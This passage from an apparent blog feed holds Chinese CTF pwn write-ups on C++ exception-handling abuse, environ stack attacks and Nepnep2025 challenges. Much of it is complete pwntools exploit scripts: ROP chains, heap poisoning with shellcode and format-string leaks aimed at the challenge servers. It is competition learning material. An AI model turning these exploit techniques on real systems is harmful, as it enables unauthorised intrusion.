class="line">add(<span class="number">0x400</span>,(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc0</span>+shellcode).ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x118</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64((stack-<span class="number">0x170</span>-<span class="number">8</span>)^(key+<span class="number">1</span>)))</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(rdi)+p64(he(<span class="number">0x2000</span>))+p64(rsi)+p64(<span class="number">0x1000</span>)+p64(rdx_r12)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(he(<span class="number">0x2000</span>)))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn-environ打栈学习&quot;&gt;&lt;a href=&quot;#pwn-environ打栈学习&quot; class=&quot;headerlink&quot; title=&quot;pwn-environ打栈学习&quot;&gt;&lt;/a&gt;pwn-environ打栈学习&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://gggtaotao.github.io/tags/pwn/"/>
    
    <category term="environ打栈" scheme="https://gggtaotao.github.io/tags/environ%E6%89%93%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>pwn-c++异常处理利用</title>
    <link href="https://gggtaotao.github.io/2025/07/30/pwn-c-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%88%A9%E7%94%A8/"/>
    <id>https://gggtaotao.github.io/2025/07/30/pwn-c-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E5%88%A9%E7%94%A8/</id>
    <published>2025-07-30T14:47:51.000Z</published>
    <updated>2025-07-30T16:29:36.317Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn-C-异常处理利用"><a href="#pwn-C-异常处理利用" class="headerlink" title="pwn-C++异常处理利用"></a>pwn-C++异常处理利用</h1><h2 id="前置准备（如何更换一个c-编译而成的程序的依赖库）"><a href="#前置准备（如何更换一个c-编译而成的程序的依赖库）" class="headerlink" title="前置准备（如何更换一个c++编译而成的程序的依赖库）"></a>前置准备（如何更换一个c++编译而成的程序的依赖库）</h2><p>一个题目如果需要用到libc的话，其他依赖库可能不会给你，但一般都会给libc，告诉是哪个版本的，我们需要获取对应版本的其他依赖库，这里给出的方法是从docker中拷贝</p><p>1.执行如下命令创建对应版本的docker，获取对应版本的依赖库，这条命令创建的是22.04的docker，扒的是2.35的libc，根据自己的需要更换版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu:22.04 /bin/bash</span><br></pre></td></tr></table></figure><p>2.进入dorker后，这个版本对应的所有依赖库一般在<strong>/usr/lib/x86_64-linux-gnu</strong>目录下，通过<strong>ls</strong>命令可以查看到所有的依赖库（我的是这样的），然后通过docker的命令将自己所需要的依赖库拷贝到本地即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> your_docker_id://usr/lib/x86_64-linux-gnu/libc path/to/your_desktop</span><br><span class="line"><span class="comment">#你的docker_id可以通过docker ps查看</span></span><br><span class="line"><span class="comment">#在/usr/lib/x86_64-linux-gnu下的libstdc++.so.6和libseccomp.so.2是软链接，应该拷贝的是形如libseccomp.so.2.5.0或者是libstdc++.so.6.30这样的elf文件，而不是软链接（文件名可能写的不是很准确，知道意思就好）</span></span><br></pre></td></tr></table></figure><p>3.通过patchelf更换一个文件的对应的依赖库，这个就不赘述了，主要就是通过这些命令替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 pwn</span><br><span class="line">patchelf --set-interpreter ./ld-linux-x86-64.so.2 pwn</span><br></pre></td></tr></table></figure><p>这里有个坑需要注意，困扰了我好长时间，我在更换<strong>libm.so.6</strong>的时候一直不成功，这是因为文件是通过<strong>libstdc++.so.6</strong>来连接<strong>libm.so.6</strong>的，需要更换<strong>libstdc++.so.6</strong>的依赖库，才可以修改成功</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-30%20230730.png" alt="屏幕截图 2025-07-30 230730"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed ./libm.so.6 ./libm.so.6 libstdc++.so.6</span><br></pre></td></tr></table></figure><p>这样就可以正确的更换所需的配套的依赖库了</p><h2 id="C-异常处理分析"><a href="#C-异常处理分析" class="headerlink" title="C++异常处理分析"></a>C++异常处理分析</h2><p>具体详细分析和讲解这里就不再说明了，大家可以参考这些大佬写的文章，很详细，<a href="https://zhuanlan.zhihu.com/p/13157062538">文章1</a>，<a href="https://zp9080.github.io/post/c++-pwn/c++%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">文章2</a></p><p>这里主要说以下我调试过程中的一些体会</p><p>1.try模块和catch模块是不会在ida里以伪代码的形式呈现的，需要在汇编指令窗口查看</p><p>2.当程序执行到<strong>__cxa_throw</strong>函数时，在这个函数里会调用<strong>_Unwind_RaiseException</strong>进行栈回退，并在<strong>_Unwind_RaiseException+463</strong>的地方查看目前回退到的这个函数栈帧是否存在catch模块可以捕获异常，如果存在，便会执行catch模块中的代码，否则会<strong>terminate</strong>强制程序终止</p><p>3.虽然编写C++代码时一个try对应的一个catch，正常情况栈回退会找到与之对应的catch模块，但是我们可以攻击栈回退时依赖的ret地址，使抛出的异常被其他try对应的catch捕获，这样就可以执行其他catch中的代码了，如果正好是后门函数，那就可以直接get_shell了</p><p>4.要想让throw抛出的错误被一个catch捕获，栈回退中的ret的地址必须是你想要执行的catch代码对应的try模块中的汇编指令或者是其仅挨着的下一条汇编指令，才能正确catch异常并执行catch模块中的代码</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-30%20234009.png" alt="屏幕截图 2025-07-30 234009"></p><p>比如上图中的try模块，要想catch后执行和这个try对应的catch中的的代码，你的ret地址必须是0x401eea~0x401f0b(0x401eea可能不行，没试过)，但是如果超过了0x401f0b，就不会正确执行到catch中的代码，而是会执行<strong>terminate</strong>，ret的地址你可以在执行到<strong>_Unwind_RaiseException+463</strong>的时候查看，在rdx寄存器里</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-30%20234837.png" alt="屏幕截图 2025-07-30 234837"></p><p>像此时，程序执行到了_Unwind_RaiseException+463，而rdx里的值是0x401efc,显然在上图的范围内，这就说明这已经是最后_Unwind_RaiseException进行的最后一次栈回退了，这次回退过后就可以找到catch模块，然后去执行catch里的代码了</p><p>5.在进入<strong>__cxa_throw</strong>前的函数栈帧的rbp和ret的地址该覆盖为什么值，该怎么选择呢？</p><p>可以看到在进入__cxa_throw之前，rbp里储存的值是0x405460,而ret里储存的值是0x401ed9</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-30%20235620.png" alt="屏幕截图 2025-07-30 235620"></p><p>可以看到在Unwind_RaiseException执行完后rbp的值就变成了0x405460，而下一条指令执行的值0x401f19是0x401ed9对应的catch模块里的代码，通过这个关系，应该就可以按照自己的思路来布置自己的payload来覆盖rbp和ret了</p><p><img src="https://taotao-1370284040.cos.ap-beijing.myqcloud.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-30%20235729.png" alt="屏幕截图 2025-07-30 235729"></p><h2 id="Nepnep2025-canutrytry"><a href="#Nepnep2025-canutrytry" class="headerlink" title="Nepnep2025 canutrytry"></a>Nepnep2025 canutrytry</h2><p>笔者太懒了，不想分析题目讲解exp了，这里放一遍大佬的wp大家参考吧，<a href="https://www.cnblogs.com/xmiscx/p/19010430#_label0">文章链接</a>，相信通过上述的分析，一步一步调试exp，可以调懂的</p><p><del>原谅我折磨懒qaq</del></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_1</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_2</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit_3</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;your choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;./canutrytry&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;nepctf30-re0p-1yod-ovkd-tywcgo6zc386.nepctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">visit_2(<span class="number">0x38</span>)</span><br><span class="line">visit_1()</span><br><span class="line">visit_2(-<span class="number">1</span>)</span><br><span class="line">visit_1()</span><br><span class="line">ru(<span class="string">b&#x27;setbufaddr:0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)-<span class="number">0x87fe0</span>-<span class="number">0x80</span></span><br><span class="line">ru(<span class="string">b&#x27;stackaddr:0x&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x405460</span>)+p64(<span class="number">0x401ed9</span>)</span><br><span class="line"></span><br><span class="line">rdi=li(<span class="number">0x000000000002a3e5</span>)</span><br><span class="line">rsi=li(<span class="number">0x000000000002be51</span>)</span><br><span class="line">rdx_r12=li(<span class="number">0x000000000011f497</span>)</span><br><span class="line">write=lis(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">visit_3(<span class="number">0</span>,payload)</span><br><span class="line">leave(<span class="number">0</span>)</span><br><span class="line">payload=p64(rdi)+p64(<span class="number">2</span>)+p64(rsi)+p64(<span class="number">0x4053c0</span>)+p64(rdx_r12)+p64(<span class="number">0x64</span>)+p64(<span class="number">0</span>)+p64(write)</span><br><span class="line">sla(<span class="string">b&#x27;well,prepare your rop now!\n&#x27;</span>,payload)</span><br><span class="line">sla(<span class="string">b&#x27;Enter your flag: &#x27;</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x405458</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">s(payload)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn-C-异常处理利用&quot;&gt;&lt;a href=&quot;#pwn-C-异常处理利用&quot; class=&quot;headerlink&quot; title=&quot;pwn-C++异常处理利用&quot;&gt;&lt;/a&gt;pwn-C++异常处理利用&lt;/h1&gt;&lt;h2 id=&quot;前置准备（如何更换一个c-编译而成的程序的依赖</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://gggtaotao.github.io/tags/pwn/"/>
    
    <category term="c++异常处理，如何更换依赖库" scheme="https://gggtaotao.github.io/tags/c-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%EF%BC%8C%E5%A6%82%E4%BD%95%E6%9B%B4%E6%8D%A2%E4%BE%9D%E8%B5%96%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Nepnep2025-CTF-pwn</title>
    <link href="https://gggtaotao.github.io/2025/07/30/Nepnep2025-CTF-pwn/"/>
    <id>https://gggtaotao.github.io/2025/07/30/Nepnep2025-CTF-pwn/</id>
    <published>2025-07-30T14:20:42.000Z</published>
    <updated>2025-07-30T16:29:14.963Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nepnep-CTF-pwn"><a href="#Nepnep-CTF-pwn" class="headerlink" title="Nepnep-CTF-pwn"></a>Nepnep-CTF-pwn</h1><p>打了一下nep的比赛，由于个人原因，做了time和astray后就没再做了，估摸着smallbox也能出来吧，总得来说体验还是不错的，赛后复现也学到了新东西hhh，我写的wp很草率，大家可以看看别人的，不要学我这么懒噢~~，<a href="https://www.cnblogs.com/xmiscx/p/19010430#_label0">链接1</a>，<a href="https://bbs.kanxue.com/thread-287806.htm">链接2</a></p><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2><p>第一次调试多进程和多线程的题，也是边调边学，这个题的考点是线程竞争，两个线程 共用一个内存地址，可以读写数据，第一次输入 file 文件名的时候随便输入一个绕过检测开启第二个线程，然后第一个线程会继续运行让你继续输入 file 文件名，这时候输入 flag ，就 可以修改内存中的数据，导致第二个进程 open(flag)（因为第二个线程运行的内容多，运行的比较慢），然后利用 fmt 泄露就可以了，但是不知道为啥，这个题%s 不行，非得用%p 泄 露，%s 卡了我很久很久，真的我哭死</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./time&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;nepctf32-4zsf-cgu6-xip5-dqatwcf4l596.nepctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;please input your name:\n&#x27;</span>,<span class="string">b&quot;%22$p%23$p%24$p%25$p%26$p%27$p%28$p%29$p&quot;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;input file name you want to read:\n&#x27;</span>,<span class="string">b&#x27;aa\nflag&#x27;</span>)</span><br><span class="line">shell()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="astray"><a href="#astray" class="headerlink" title="astray"></a>astray</h2><p>这个堆题还是蛮有意思的</p><p>这里把大小为 0x2000 的 chunk 称为 chunk1 ，用来填写 user 操作的 0x18 的 chunk 记为 chunk2 ，把 manager 操作的 0x18 的 chunk 记为 chunk3</p><p>首先可以登录 manager ，然后 read 的 index 为 0 ，便可以泄露出 heap 和 pie ，然后利用 逻辑漏洞可以把 user 的操作地址改为 index 为 0 的块，（但是代码想体现的逻辑是 manager 能操作 index 为 1~19，user 能操作 index 为 10~ 19，这就已经是违法的了），然后利用 manager 对 user 的 visit 操作，可以修改 index 为 0 块的内容，但是这个地方记录了 manager 和 user 执行操作的指针索引值，到这里，这道题的漏洞利用完成，已经可以实现很多事情了，我的 exp 是泄露 libc ，然后打 stdout 结构体，在 puts 调用的时候就可以 get_shell 了</p><p>噢对，看了一眼别人的exp，也可以利用environ打栈然后rop，也很有意思</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : 